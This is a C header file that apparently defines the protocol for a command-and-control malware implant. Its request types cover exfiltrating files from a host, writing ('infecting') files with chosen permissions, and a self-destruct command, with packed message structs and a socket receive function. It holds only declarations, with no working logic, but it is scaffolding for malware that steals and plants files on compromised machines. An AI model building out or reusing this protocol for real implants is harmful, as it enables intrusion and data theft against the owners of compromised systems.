#ifndef CNC_PROT_H
#define CNC_PROT_H

#include <stdint.h>

enum req_type
{
    EXF_FILE,
    INF_FILE,
    SUICIDE
};

enum file_status
{
    GOOD,
    OPEN_ERROR,
    READ_ERROR,
    WRITE_ERROR,
    STAT_ERROR,
};

struct __attribute__((__packed__)) c2_req
{
    uint8_t type;
    uint32_t req_len;
};

struct __attribute__((__packed__)) c2_res
{
    uint8_t type;
    uint32_t res_len;
};

struct __attribute__((__packed__)) exf_req
{
    struct c2_req header;
    uint8_t path_len;
    char path[];
};

struct __attribute__((__packed__)) exf_res
{
    struct c2_res header;
    uint8_t status;
    uint32_t content_len;
    char content[];
};

struct __attribute__((__packed__)) inf_req
{
    struct c2_req header;
    uint16_t perm;
    uint8_t path_len;
    uint32_t content_len;
    char path_content[];
};

struct __attribute__((__packed__)) inf_res
{
    struct c2_res header;
    uint8_t status;
};

struct exf_res *exf_res_init(uint32_t file_size, enum file_status status);
struct inf_res *inf_res_init(enum file_status status);
struct c2_req *receive_command(int sockfd);

#endif
